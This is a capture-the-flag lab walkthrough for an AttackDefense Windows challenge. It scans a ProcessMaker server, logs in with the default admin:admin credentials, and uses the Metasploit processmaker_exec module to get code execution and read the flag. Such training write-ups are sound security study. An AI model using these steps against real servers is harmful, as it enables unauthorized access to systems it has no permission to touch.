# ðŸ”¬Win Workflow Platform - MS

## Lab 1 <a href="#lab-1" id="lab-1"></a>

> ðŸ”¬ [Windows: Workflow Platform](https://attackdefense.com/challengedetailsnoauth?cid=1946)
>
> * Target IP: `10.0.28.252`
> * Exploit a vulnerable ProcessMaker server with **Metasploit**

```bash
nmap -sS -sV 10.0.28.252
```

```bash
Not shown: 990 closed ports
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Apache httpd 2.2.23 ((Win32) PHP/5.2.14)
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3306/tcp  open  mysql              MySQL (unauthorized)
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

#### Enumeration <a href="#enumeration" id="enumeration"></a>

* Explore the web application hosted on the web server, before running any vuln scanners
* Search the target IP `10.0.28.252` in browser.

<figure><img src="../../../../.gitbook/assets/image (10) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* View the web page source code. In this case no **version information** can be found.
* Search online for `ProcessMaker` [default credentials](https://wiki.processmaker.com/index.php/2.0/Login\_Settings)
  * `admin`:`admin`

<figure><img src="../../../../.gitbook/assets/image (11) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (12) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Exploitation <a href="#exploitation" id="exploitation"></a>

```bash
searchsploit ProcessMaker
# Try "ProcessMaker Open Source - (Authenticated) PHP Code Execution (Metasploit)"

cd Desktop
searchsploit -m 29325
less 29325.rb
rm 29325.rb
# In this case a Metasploit module will be used
```

<figure><img src="../../../../.gitbook/assets/image (13) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
service postgresql start && msfconsole -q
```

```bash
db_status
setg RHOSTS 10.0.28.252
workspace -a ProcessMaker
```

```bash
search ProcessMaker
use exploit/multi/http/processmaker_exec
options
set USERNAME admin
set PASSWORD admin
exploit
```

<figure><img src="../../../../.gitbook/assets/image (14) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (15) (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
pwd
cd /
dir
cat flag.txt
```

{% hint style="success" %}
**Flag:** `a3dcb4d229de6fde0db5686dee47145d`
{% endhint %}
